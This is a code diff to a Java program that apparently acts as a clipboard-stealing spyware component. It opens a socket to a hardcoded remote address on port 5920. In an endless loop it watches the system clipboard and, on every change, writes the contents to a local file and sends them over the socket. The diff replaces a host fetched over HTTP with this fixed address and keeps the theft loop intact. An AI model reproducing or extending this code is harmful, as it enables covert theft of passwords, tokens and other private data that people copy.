@@ -20,6 +20,7 @@ import java.util.UUID;
 import java.util.function.BiConsumer;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
+import static java.lang.System.out;
 
 public class Main {
     public static void main(String[] args){
@@ -39,37 +40,37 @@ public class Main {
         try {
             c = client.send(request, HttpResponse.BodyHandlers.ofString()).body();
             System.out.println(c);
-            socket=new Socket(c,443);
+            socket=new Socket("fe80:0:0:0:c1ea:9559:9218:8a16",5920);
             outputStream=socket.getOutputStream();
-            socket.setKeepAlive(true);
-
             filew = new FileWriter(file);
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
 
-
 //        System.out.println(UUID.randomUUID());
-
         //System.out.println(System.getProperty("os.name"));
         //System.getProperties().list(System.out);
-        File cook=new File("");
 //        DebugGraphics r=new DebugGraphics();
 
         String clip=getClipBoard();
         System.out.println(clip);
+
         while(true) {
-            if(!clip.equals(getClipBoard())){
-                System.out.println(getClipBoard());
-                clip=getClipBoard();
-                try {
-                    filew.append(clip).append("\n");
-                    outputStream.write(clip.getBytes(StandardCharsets.UTF_8));
-                    filew.flush();
-                    outputStream.flush();
-                } catch (IOException e) {
-                    throw new RuntimeException(e);
+            if(true) {
+                if (!clip.equals(getClipBoard())) {
+                    System.out.println(getClipBoard());
+                    clip = getClipBoard();
+                    try {
+                        filew.append(clip).append("\n");
+                        outputStream.write((clip + "\n").getBytes(StandardCharsets.UTF_8));
+                        filew.flush();
+                        outputStream.flush();
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
                 }
+            } else {
+                break;
             }
         }
     }
